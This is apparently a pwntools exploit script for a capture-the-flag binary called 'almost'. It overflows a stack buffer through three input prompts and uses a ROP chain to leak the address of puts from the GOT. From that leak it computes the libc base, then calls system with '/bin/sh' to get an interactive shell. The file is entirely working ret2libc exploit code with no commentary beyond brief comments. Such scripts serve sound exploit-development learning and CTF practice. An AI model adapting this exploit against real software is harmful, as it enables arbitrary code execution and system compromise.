from pwn import * 

p=process("./almost")

junk1 = 'A'*64 #64 
junk2 = 'A'*64 #64

#64+64=128
#offset = 138
#need 10 chars to get EIP



def send(junk1,junk2,payload):
  p.recvuntil("Insert the protocol:\n")
  p.sendline(junk1) 
  p.recvuntil("Insert the domain:\n")
  p.sendline(junk2) 
  p.recvuntil("Insert the path:\n")
  p.sendline(payload)


binary = ELF("almost")
elf = ELF("libc6-i386_2.27-3ubuntu1.2_amd64.so") 
#gadgets to call puts to leak puts got
puts_got = binary.got['puts']
puts_plt = binary.plt['puts'] 
main_plt = binary.symbols['main']
pop_ebx = 0x08048371 #: pop ebx; ret;

payload1 = ''
payload1 += 'A'*10         #control EIP
payload1 += p32(puts_plt) #puts()
payload1 += p32(pop_ebx)  
payload1 += p32(puts_got) # puts(puts_got)
payload1 += p32(main_plt) #return addr
payload1 += 'A' * (63-len(payload1))


send(junk1,junk2,payload1)
p.recvline()
p.recvline()
recieved = p.recv(4)
leak_addr = u32(recieved)
log.info("Leaked Libc Address: " + hex(leak_addr))

libc_base = leak_addr - elf.symbols['puts']
system_libc = elf.symbols['system'] + libc_base
bin_sh_libc = 0x17bb8f + libc_base



payload2 = ''
payload2 += 'A'*10 #eip
payload2 += p32(system_libc)
payload2 += p32(pop_ebx)
payload2 += p32(bin_sh_libc)
payload2 += "A"*(63-len(payload2))

send(junk1,junk2,payload2)
p.interactive()


